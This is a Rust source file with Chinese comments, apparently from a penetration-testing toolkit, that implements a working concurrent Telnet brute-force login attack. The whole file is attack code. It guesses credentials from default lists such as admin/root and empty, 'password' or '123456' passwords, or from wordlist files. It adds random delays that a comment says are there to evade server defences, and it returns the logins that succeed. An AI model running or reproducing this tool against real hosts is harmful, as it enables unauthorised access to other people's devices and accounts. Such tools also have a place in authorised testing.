use crate::handler::brute::{BruteForceResult, BruteForceTask, Protocol, TaskStatus, BruteForceManager};
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use std::time::{Duration, Instant};
use futures::future::join_all;
use rand::Rng;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use regex::Regex;
use std::io::{Error, ErrorKind};

// Telnet暴力破解功能
pub async fn telnet_brute_force(
    task: BruteForceTask,
    manager_state: Arc<Mutex<BruteForceManager>>
) -> Vec<BruteForceResult> {
    let target = task.target.clone();
    let port = if task.port == 0 { 23 } else { task.port }; // 默认Telnet端口23
    let task_id = task.id.unwrap_or(0);
    let num_threads = task.threads.max(1) as usize;
    
    // 获取用户名和密码列表
    let usernames = match (task.usernames.clone(), task.username_file.clone()) {
        (Some(names), _) if !names.is_empty() => names,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["admin".to_string(), "root".to_string(), "user".to_string()],
    };

    let passwords = match (task.passwords.clone(), task.password_file.clone()) {
        (Some(pwds), _) if !pwds.is_empty() => pwds,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["".to_string(), "admin".to_string(), "password".to_string(), "123456".to_string()],
    };

    if usernames.is_empty() || passwords.is_empty() {
        return Vec::new();
    }

    let semaphore = Arc::new(Semaphore::new(num_threads));
    let mut spawned_tasks = Vec::new();

    'outer: for username in usernames {
        for password in &passwords {
            // 检查任务是否已从外部停止
            {
                let guard = manager_state.lock().await;
                if let Some(current_task_in_manager) = guard.tasks.iter().find(|t| t.id == Some(task_id)) {
                    if current_task_in_manager.status == TaskStatus::Stopped {
                        break 'outer;
                    }
                } else {
                    break 'outer;
                }
            }

            let permit = match semaphore.clone().acquire_owned().await {
                Ok(p) => p,
                Err(_) => break 'outer,
            };

            let t_target = target.clone();
            let t_port = port;
            let t_username = username.clone();
            let t_password = password.clone();
            let t_timeout_secs = task.timeout;
            let t_task_id = task_id;
            let t_protocol_clone = task.protocol.clone();
            
            // 增加随机延迟以避免触发服务器防御机制
            let delay_ms = rand::thread_rng().gen_range(10..100);
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;

            spawned_tasks.push(tokio::spawn(async move {
                let start_time = Instant::now();
                
                // Telnet连接尝试
                let result = try_telnet_login(&t_target, t_port, &t_username, &t_password, t_timeout_secs).await;
                let duration = start_time.elapsed().as_millis() as u64;
                drop(permit);
                
                match result {
                    Ok(_) => {
                        // 登录成功
                        Some(BruteForceResult {
                            task_id: t_task_id,
                            target: t_target,
                            protocol: t_protocol_clone,
                            username: t_username,
                            password: t_password,
                            success: true,
                            time_taken: duration,
                            error: None,
                        })
                    },
                    Err(_) => None, // 不返回失败结果
                }
            }));
        }
    }

    let mut results = Vec::new();
    for task_handle in join_all(spawned_tasks).await {
        match task_handle {
            Ok(Some(result)) => {
                results.push(result);
            }
            Ok(None) => {
                // 登录尝试失败，不做任何操作
            }
            Err(e) => {
                eprintln!("Telnet brute force task panicked: {}", e);
            }
        }
    }

    results
}

// 尝试Telnet登录
async fn try_telnet_login(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Result<(), String> {
    // 尝试建立TCP连接
    let stream = match tokio::time::timeout(
        Duration::from_secs(timeout_secs), 
        TcpStream::connect(format!("{}:{}", host, port))
    ).await {
        Ok(Ok(stream)) => stream,
        Ok(Err(e)) => return Err(format!("Telnet connection error: {}", e)),
        Err(_) => return Err("Telnet connection timed out".to_string()),
    };
    
    // 设置读写超时
    stream.set_nodelay(true)
        .map_err(|e| format!("Failed to set nodelay: {}", e))?;

    // 创建互斥锁以共享流
    let stream = Arc::new(tokio::sync::Mutex::new(stream));
    
    // 等待登录提示
    match wait_for_prompt(Arc::clone(&stream), "login:|username:|user:", timeout_secs).await {
        Ok(_) => {
            // 发送用户名
            let mut locked_stream = stream.lock().await;
            locked_stream.write_all(format!("{}\n", username).as_bytes())
                .await
                .map_err(|e| format!("Failed to send username: {}", e))?;
            drop(locked_stream);
            
            // 等待密码提示
            match wait_for_prompt(Arc::clone(&stream), "password:|pass:", timeout_secs).await {
                Ok(_) => {
                    // 发送密码
                    let mut locked_stream = stream.lock().await;
                    locked_stream.write_all(format!("{}\n", password).as_bytes())
                        .await
                        .map_err(|e| format!("Failed to send password: {}", e))?;
                    drop(locked_stream);
                    
                    // 等待登录成功提示（通常是命令提示符号）
                    match wait_for_prompt(Arc::clone(&stream), "\\$|>|#", timeout_secs).await {
                        Ok(_) => Ok(()),
                        Err(_) => Err("Login failed - no shell prompt".to_string()),
                    }
                },
                Err(e) => Err(format!("Failed waiting for password prompt: {}", e)),
            }
        },
        Err(e) => Err(format!("Failed waiting for login prompt: {}", e)),
    }
}

// 等待特定的提示符
async fn wait_for_prompt(stream: Arc<tokio::sync::Mutex<TcpStream>>, prompt_pattern: &str, timeout_secs: u64) -> Result<(), String> {
    let regex = Regex::new(prompt_pattern)
        .map_err(|e| format!("Invalid regex pattern: {}", e))?;
    
    let start_time = Instant::now();
    let timeout = Duration::from_secs(timeout_secs);
    let mut buffer = [0u8; 1024];
    let mut received_data = String::new();
    
    while start_time.elapsed() < timeout {
        let mut locked_stream = stream.lock().await;
        
        // 设置读取超时
        match tokio::time::timeout(Duration::from_millis(500), locked_stream.read(&mut buffer)).await {
            Ok(Ok(n)) if n > 0 => {
                received_data.push_str(&String::from_utf8_lossy(&buffer[..n]));
                
                // 检查是否收到预期的提示符
                if regex.is_match(&received_data) {
                    return Ok(());
                }
            },
            Ok(Ok(_)) => {
                // 连接关闭
                return Err("Connection closed by remote host".to_string());
            },
            Ok(Err(e)) => {
                return Err(format!("Error reading from socket: {}", e));
            },
            Err(_) => {
                // 超时，继续尝试
            },
        };
        
        drop(locked_stream);
        
        // 短暂延迟以避免CPU过度使用
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    // 超时
    Err("Timed out waiting for prompt".to_string())
} 